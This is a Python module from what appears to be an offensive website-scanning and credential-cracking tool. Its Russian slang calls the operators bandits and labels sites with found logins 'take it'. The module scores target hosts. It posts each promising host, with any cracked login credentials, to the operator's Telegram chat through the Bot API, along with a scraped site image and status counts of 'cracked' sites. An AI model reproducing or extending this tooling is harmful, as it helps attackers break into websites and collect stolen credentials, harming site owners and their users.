# -*- coding: utf-8 -*-
import json
import os
import re

from curl_cffi import CurlMime
from curl_cffi import requests as creq

from core import config, http

SET = os.path.join(config.DATA, "settings.json")

HELLO = "ЗДАРОВА БАНДИТЫ ЕП, Я ГОТОВ ОТНИМАТЬ"

API = "https://api.telegram.org/bot%s/"
IMG_RE = re.compile(r'\.(?:jpg|jpeg|png|webp)(?:\?|$)', re.I)
OG1 = re.compile(r'<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)', re.I)
OG2 = re.compile(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:image', re.I)
IMG = re.compile(r'<img[^>]+src=["\']([^"\']+)["\']', re.I)


def cfg():
    if os.path.isfile(SET):
        try:
            with open(SET, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_cfg(data):
    cur = cfg()
    cur.update(data)
    with open(SET, "w", encoding="utf-8") as f:
        json.dump(cur, f, ensure_ascii=False, indent=2)


def _call(method, payload):
    c = cfg()
    token, chat = c.get("tg_token"), c.get("tg_chat")
    if not token:
        return False, "нет токена"
    if not chat:
        return False, "нет id чата"
    payload["chat_id"] = chat
    try:
        r = creq.post(API % token + method, data=payload,
                      impersonate="chrome", timeout=25)
        return r.status_code == 200, "%d %s" % (r.status_code, r.text[:200])
    except BaseException as e:
        return False, "сеть: " + str(e).splitlines()[0]


def photo(path, caption=""):
    """Отправка картинки файлом. Возвращает True при успехе."""
    c = cfg()
    token, chat = c.get("tg_token"), c.get("tg_chat")
    if not token or not chat:
        return False
    try:
        with open(path, "rb") as f:
            data = f.read()
        mp = CurlMime()
        mp.addpart(name="chat_id", data=str(chat).encode())
        mp.addpart(name="caption", data=caption[:900].encode("utf-8"))
        mp.addpart(name="photo", filename=os.path.basename(path),
                   content_type="image/png", data=data)
        r = creq.post(API % token + "sendPhoto", multipart=mp,
                      impersonate="chrome", timeout=60)
        return r.status_code == 200
    except BaseException:
        return False


def send(text):
    return _call("sendMessage", {"text": text[:3800],
                                 "disable_web_page_preview": True})[0]


def send2(text):
    return _call("sendMessage", {"text": text[:3800],
                                 "disable_web_page_preview": True})


def _abs(host, url):
    if url.startswith("//"):
        return "https:" + url
    if url.startswith("/"):
        return "https://" + host + url
    if url.startswith("http"):
        return url
    return ""


def shot_url(host):
    try:
        r = http.get(host, "/", timeout=15)
    except Exception:
        return ""
    body = r.text[:200000]
    for rx in (OG1, OG2):
        m = rx.search(body)
        if m:
            u = _abs(host, m.group(1).strip())
            if u:
                return u
    for m in IMG.finditer(body):
        u = _abs(host, m.group(1).strip())
        if u and IMG_RE.search(u) and "svg" not in u.lower():
            return u
    return ""


def verdict(rec):
    if rec.get("creds"):
        return "ВХОД, БРАТЬ"
    s = rec.get("score", 0)
    if s >= 8:
        return "КАК ПРИОРА НА 100 БЕНЗЕ"
    if s >= 3:
        return "ЕСТЬ ЗАЦЕПКИ"
    return ""


def site(host, rec):
    v = verdict(rec)
    if not v:
        return False
    c = cfg()
    if not c.get("tg_sites", True):
        return False

    notes = ", ".join(rec.get("notes") or []) or "-"
    text = "%s\n%s\nбаллы: %s" % (v, host, rec.get("score", 0))
    if notes != "-":
        text += "\n" + notes
    if rec.get("creds"):
        text += "\nвход: " + rec["creds"]

    if c.get("tg_photo", True):
        img = shot_url(host)
        if img:
            ok, _ = _call("sendPhoto", {"photo": img, "caption": text[:1000]})
            if ok:
                return True
    return send(text)


def hello_text():
    return cfg().get("tg_hello") or HELLO


def hello():
    return send(hello_text())


def beat(state_counts=None, run=None):
    c = cfg()
    if not c.get("tg_beat", True):
        return False
    from core import state
    cnt = state_counts or state.counts()
    text = ("панель жива\nмашина: %s\nочередь %d, годных %d, входов %d\nпрогон: %s"
            % (state.machine(), cnt.get("new", 0), cnt.get("hot", 0),
               cnt.get("cracked", 0), run or "нет"))
    return send(text)
